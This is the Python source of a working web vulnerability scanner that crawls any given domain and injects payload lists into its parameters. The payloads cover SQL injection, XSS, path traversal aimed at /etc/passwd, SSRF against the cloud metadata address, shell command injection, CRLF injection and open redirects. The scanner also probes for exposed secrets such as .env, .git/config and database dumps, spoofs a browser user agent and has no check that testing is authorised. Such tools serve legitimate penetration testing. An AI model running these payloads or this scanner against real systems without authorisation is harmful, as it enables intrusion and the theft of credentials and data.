import time
import random
import requests
from urllib.parse import urlparse, urljoin, parse_qs, urlencode, urlunparse
from bs4 import BeautifulSoup
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

TIMEOUT = 10
DELAY = 0.3

SQLI_PAYLOADS = [
    "'", "\"", "' OR '1'='1", "' OR 1=1--", "1' AND SLEEP(3)--",
    "1' UNION SELECT NULL--", "1' UNION SELECT NULL,NULL--",
    "admin'--", "' OR 'x'='x",
]

SQLI_TIME_PAYLOADS = [
    "1' AND SLEEP(5)--",
    "1' AND (SELECT SLEEP(5))--",
    "1' AND pg_sleep(5)--",
    "1'; WAITFOR DELAY '0:0:5'--",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "'-alert(1)-'",
]

LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../etc/hosts",
    "../../../../windows/win.ini",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "php://filter/convert.base64-encode/resource=index.php",
    "/etc/passwd%00",
]

SSRF_PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://169.254.169.254/latest/meta-data/",
    "file:///etc/passwd",
    "http://[::1]",
    "http://0.0.0.0",
]

CMD_INJECTION_PAYLOADS = [
    "; ls", "| ls", "&& ls", "`ls`", "$(ls)",
    "; whoami", "| whoami", "; cat /etc/passwd",
]

CRLF_PAYLOADS = [
    "%0d%0aSet-Cookie:crlf=injection",
    "%0d%0aX-Injected:crlf",
    "\r\nSet-Cookie:crlf=injection",
]

SQLI_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "microsoft odbc",
    "odbc sql server driver",
    "sqlserver jdbc driver",
    "mysql_fetch_array",
    "pg_query",
    "sqlite3.operationalerror",
    "ora-01756",
    "syntax error",
]

LFI_SIGS = ["root:x:0:0", "daemon:x:", "[extensions]", "/bin/bash", "for 16-bit app support"]

SSRF_SIGS = ["127.0.0.1", "localhost", "metadata", "root:x:0:0", "ami-id"]

SENSITIVE_FILES = [
    "/.env", "/.env.local", "/.env.prod", "/.env.backup",
    "/.git/config", "/.git/HEAD", "/.gitignore",
    "/.svn/entries", "/.htaccess", "/.htpasswd",
    "/wp-config.php", "/wp-config.php.bak", "/wp-config.php.old",
    "/config.php", "/config.php.bak", "/config.json", "/config.yml", "/config.yaml",
    "/backup.sql", "/database.sql", "/db.sql", "/dump.sql",
    "/phpinfo.php", "/info.php", "/test.php",
    "/admin/", "/admin.php", "/administrator/", "/wp-admin/",
    "/phpmyadmin/", "/pma/", "/mysql/",
    "/server-status", "/server-info",
    "/.DS_Store", "/Thumbs.db",
    "/robots.txt", "/sitemap.xml", "/crossdomain.xml",
    "/swagger.json", "/swagger.yaml", "/api-docs", "/openapi.json",
    "/.well-known/security.txt", "/security.txt",
    "/actuator/health", "/actuator/env", "/actuator/beans",
    "/console", "/debug", "/test", "/jenkins/",
    "/backup/", "/old/", "/temp/", "/logs/", "/tmp/",
    "/error.log", "/access.log", "/debug.log",
    "/Dockerfile", "/docker-compose.yml", "/.dockerignore",
    "/package.json", "/composer.json", "/yarn.lock",
]

SECURITY_HEADERS = [
    "Strict-Transport-Security",
    "Content-Security-Policy",
    "X-Content-Type-Options",
    "X-Frame-Options",
    "X-XSS-Protection",
    "Referrer-Policy",
    "Permissions-Policy",
]


class VulnScanner:
    def __init__(self, target, cookies=None, headers=None, proxy=None, progress_cb=None):
        from modules.utils import normalize_url, resolve_domain
        self.target = normalize_url(target)
        self.parsed = urlparse(self.target)
        self.domain = self.parsed.hostname
        self.ip = resolve_domain(self.domain)
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                          "AppleWebKit/537.36 (KHTML, like Gecko) "
                          "Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Connection": "close",
        })
        if headers:
            self.session.headers.update(headers)
        if cookies:
            self.session.cookies.update(cookies)
        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}

        self.findings = []
        self.forms = []
        self.urls = set()
        self.params = set()
        self.progress = progress_cb or (lambda msg: None)

    def log(self, msg):
        self.progress(msg)

    def add_finding(self, name, severity, url, evidence="", cvss=None, cwe=None):
        self.findings.append({
            "name": name,
            "severity": severity,
            "url": url,
            "evidence": evidence[:500],
            "cvss": cvss,
            "cwe": cwe,
            "time": time.strftime("%Y-%m-%d %H:%M:%S"),
        })
        self.log(f"[VULN] {name} [{severity}] -> {url}")

    def request(self, url, method="GET", data=None, params=None,
                allow_redirects=True, timeout=TIMEOUT):
        try:
            time.sleep(DELAY)
            if method.upper() == "POST":
                return self.session.post(url, data=data, params=params,
                                         timeout=timeout, allow_redirects=allow_redirects)
            return self.session.get(url, params=params,
                                    timeout=timeout, allow_redirects=allow_redirects)
        except:
            return None

    def crawl(self, url=None, depth=2):
        if url is None:
            url = self.target
        if depth <= 0 or url in self.urls:
            return
        self.urls.add(url)
        r = self.request(url)
        if not r or r.status_code >= 400:
            return
        soup = BeautifulSoup(r.text, "html.parser")

        for a in soup.find_all("a", href=True):
            full = urljoin(url, a["href"])
            if self.domain in full and full not in self.urls:
                self.crawl(full, depth - 1)

        for form in soup.find_all("form"):
            action = form.get("action", "")
            method = form.get("method", "GET").upper()
            inputs = [{"name": inp.get("name"), "type": inp.get("type", "text"),
                       "value": inp.get("value", "test")}
                      for inp in form.find_all(["input", "textarea", "select"])
                      if inp.get("name")]
            self.forms.append({
                "action": urljoin(url, action),
                "method": method,
                "inputs": inputs,
            })

        if "?" in url:
            for k in parse_qs(urlparse(url).query):
                self.params.add((url, k))

    def check_headers(self):
        self.log("Cek security headers...")
        r = self.request(self.target)
        if not r:
            return
        missing = [h for h in SECURITY_HEADERS
                   if h.lower() not in [k.lower() for k in r.headers.keys()]]
        if missing:
            self.add_finding("Missing Security Headers", "LOW",
                             self.target, f"Missing: {', '.join(missing)}",
                             cwe="CWE-693")

    def check_sensitive_files(self):
        self.log("Cek sensitive files...")
        for path in SENSITIVE_FILES:
            url = self.target + path
            r = self.request(url, allow_redirects=False)
            if not r:
                continue
            if r.status_code == 200 and len(r.text) > 0:
                if "404" in r.text[:500] or "not found" in r.text[:500].lower():
                    continue
                sev = "CRITICAL" if any(x in path for x in [".env", ".git", "config", "backup", "sql", "wp-config"]) else "HIGH"
                self.add_finding(f"Sensitive File: {path}", sev, url,
                                 f"Status: {r.status_code}, Size: {len(r.text)}",
                                 cwe="CWE-200")

    def test_sqli(self):
        self.log("Cek SQL Injection...")
        for url, param in list(self.params)[:15]:
            parsed = urlparse(url)
            qs = parse_qs(parsed.query)
            for payload in SQLI_PAYLOADS:
                nq = qs.copy()
                nq[param] = [payload]
                test_url = urlunparse(parsed._replace(query=urlencode(nq, doseq=True)))
                r = self.request(test_url)
                if not r:
                    continue
                body = r.text.lower()
                for err in SQLI_ERRORS:
                    if err in body:
                        self.add_finding("SQL Injection (Error-Based)", "CRITICAL",
                                         test_url, f"Payload: {payload} | Error: {err}",
                                         cvss="9.8", cwe="CWE-89")
                        break

        for url, param in list(self.params)[:5]:
            parsed = urlparse(url)
            qs = parse_qs(parsed.query)
            for payload in SQLI_TIME_PAYLOADS:
                nq = qs.copy()
                nq[param] = [payload]
                test_url = urlunparse(parsed._replace(query=urlencode(nq, doseq=True)))
                start = time.time()
                r = self.request(test_url, timeout=15)
                elapsed = time.time() - start
                if elapsed >= 4.5:
                    self.add_finding("SQL Injection (Time-Based)", "CRITICAL",
                                     test_url, f"Payload: {payload} | Delay: {elapsed:.2f}s",
                                     cvss="9.8", cwe="CWE-89")
                    break

    def test_xss(self):
        self.log("Cek XSS...")
        for url, param in list(self.params)[:15]:
            parsed = urlparse(url)
            qs = parse_qs(parsed.query)
            for payload in XSS_PAYLOADS:
                nq = qs.copy()
                nq[param] = [payload]
                test_url = urlunparse(parsed._replace(query=urlencode(nq, doseq=True)))
                r = self.request(test_url)
                if r and payload in r.text:
                    self.add_finding("Reflected XSS", "HIGH", test_url,
                                     f"Payload: {payload}",
                                     cvss="6.1", cwe="CWE-79")
                    break

    def test_lfi(self):
        self.log("Cek LFI...")
        for url, param in list(self.params)[:15]:
            parsed = urlparse(url)
            qs = parse_qs(parsed.query)
            for payload in LFI_PAYLOADS:
                nq = qs.copy()
                nq[param] = [payload]
                test_url = urlunparse(parsed._replace(query=urlencode(nq, doseq=True)))
                r = self.request(test_url)
                if not r:
                    continue
                for sig in LFI_SIGS:
                    if sig in r.text:
                        self.add_finding("Local File Inclusion", "CRITICAL",
                                         test_url, f"Payload: {payload} | Sig: {sig}",
                                         cvss="9.8", cwe="CWE-22")
                        break

    def test_ssrf(self):
        self.log("Cek SSRF...")
        ssrf_params = ["url", "uri", "path", "dest", "redirect", "target", "rurl", "src"]
        for url, param in list(self.params):
            if param.lower() not in ssrf_params:
                continue
            parsed = urlparse(url)
            qs = parse_qs(parsed.query)
            for payload in SSRF_PAYLOADS:
                nq = qs.copy()
                nq[param] = [payload]
                test_url = urlunparse(parsed._replace(query=urlencode(nq, doseq=True)))
                r = self.request(test_url)
                if not r:
                    continue
                for sig in SSRF_SIGS:
                    if sig in r.text:
                        self.add_finding("SSRF", "CRITICAL", test_url,
                                         f"Payload: {payload} | Sig: {sig}",
                                         cvss="9.1", cwe="CWE-918")
                        break

    def test_open_redirect(self):
        self.log("Cek Open Redirect...")
        redirect_params = ["url", "redirect", "next", "return", "goto",
                           "dest", "destination", "redir", "r", "u", "link", "target"]
        for url, param in list(self.params):
            if param.lower() not in redirect_params:
                continue
            for payload in ["https://evil.com", "//evil.com", "https://google.com"]:
                parsed = urlparse(url)
                qs = parse_qs(parsed.query)
                nq = qs.copy()
                nq[param] = [payload]
                test_url = urlunparse(parsed._replace(query=urlencode(nq, doseq=True)))
                r = self.request(test_url, allow_redirects=False)
                if not r:
                    continue
                if r.status_code in (301, 302, 303, 307, 308):
                    loc = r.headers.get("Location", "")
                    if "evil.com" in loc or "google.com" in loc:
                        self.add_finding("Open Redirect", "MEDIUM", test_url,
                                         f"Redirect: {loc}", cvss="6.1", cwe="CWE-601")
                        break

    def test_cmd_injection(self):
        self.log("Cek Command Injection...")
        for url, param in list(self.params)[:10]:
            parsed = urlparse(url)
            qs = parse_qs(parsed.query)
            for payload in CMD_INJECTION_PAYLOADS:
                nq = qs.copy()
                nq[param] = [payload]
                test_url = urlunparse(parsed._replace(query=urlencode(nq, doseq=True)))
                r = self.request(test_url)
                if not r:
                    continue
                if "root:x:0:0" in r.text or "uid=" in r.text.lower():
                    self.add_finding("Command Injection", "CRITICAL", test_url,
                                     f"Payload: {payload}", cvss="9.8", cwe="CWE-78")
                    break

    def test_crlf(self):
        self.log("Cek CRLF Injection...")
        for url, param in list(self.params)[:10]:
            parsed = urlparse(url)
            qs = parse_qs(parsed.query)
            for payload in CRLF_PAYLOADS:
                nq = qs.copy()
                nq[param] = [payload]
                test_url = urlunparse(parsed._replace(query=urlencode(nq, doseq=True)))
                r = self.request(test_url, allow_redirects=False)
                if not r:
                    continue
                if "crlf=injection" in str(r.headers) or "x-injected" in str(r.headers).lower():
                    self.add_finding("CRLF Injection", "MEDIUM", test_url,
                                     f"Payload: {payload}", cvss="6.1", cwe="CWE-93")
                    break

    def test_cors(self):
        self.log("Cek CORS...")
        from modules.recon import cors_check
        results = cors_check(self.target)
        for r in results:
            self.add_finding(r["issue"], r["severity"], self.target,
                             f"ACAO: {r['acao']} | ACAC: {r['acac']}",
                             cwe="CWE-942")

    def test_jwt(self):
        self.log("Cek JWT...")
        for cookie in self.session.cookies:
            if len(cookie.value.split(".")) == 3:
                self.add_finding("JWT Token Found", "INFO", self.target,
                                 f"Cookie: {cookie.name}", cwe="CWE-522")

    def test_http_methods(self):
        self.log("Cek HTTP methods...")
        dangerous = []
        for method in ["PUT", "DELETE", "TRACE", "OPTIONS", "PATCH", "CONNECT"]:
            try:
                r = self.session.request(method, self.target,
                                         timeout=TIMEOUT, verify=False)
                if r.status_code not in (405, 501, 404):
                    dangerous.append(f"{method} -> {r.status_code}")
            except:
                pass
        if dangerous:
            self.add_finding("Dangerous HTTP Methods", "MEDIUM", self.target,
                             ", ".join(dangerous), cwe="CWE-650")

    def dir_bruteforce(self, wordlist=None):
        self.log("Directory bruteforce...")
        if wordlist is None:
            wordlist = [
                "admin", "login", "api", "backup", "config", "test",
                "dev", "staging", "private", "secret", "hidden",
                "dashboard", "panel", "cpanel", "manage", "management",
                "uploads", "files", "download", "assets", "static",
                "docs", "documentation", "help", "support",
                "old", "new", "tmp", "temp", "cache", "logs",
                "includes", "inc", "lib", "vendor", "src",
            ]
        for word in wordlist:
            url = f"{self.target}/{word}/"
            r = self.request(url, allow_redirects=False)
            if r and r.status_code in (200, 301, 302, 403):
                sev = "MEDIUM" if r.status_code == 200 else "LOW"
                self.add_finding(f"Directory Found: /{word}/", sev, url,
                                 f"Status: {r.status_code}", cwe="CWE-548")

    def run(self):
        from modules.utils import is_valid_domain, resolve_domain
        if not is_valid_domain(self.domain):
            return {"error": f"Domain tidak valid: {self.domain}"}
        if not self.ip:
            return {"error": f"Domain tidak bisa di-resolve: {self.domain}"}

        self.log(f"Domain: {self.domain}")
        self.log(f"IP: {self.ip}")
        self.crawl()
        self.log(f"Crawl: {len(self.urls)} URL, {len(self.forms)} form, {len(self.params)} param")
        self.check_headers()
        self.check_sensitive_files()
        self.test_sqli()
        self.test_xss()
        self.test_lfi()
        self.test_ssrf()
        self.test_open_redirect()
        self.test_cmd_injection()
        self.test_crlf()
        self.test_cors()
        self.test_jwt()
        self.test_http_methods()
        self.dir_bruteforce()

        return {
            "target": self.target,
            "domain": self.domain,
            "ip": self.ip,
            "time": time.strftime("%Y-%m-%d %H:%M:%S"),
            "findings": self.findings,
        }
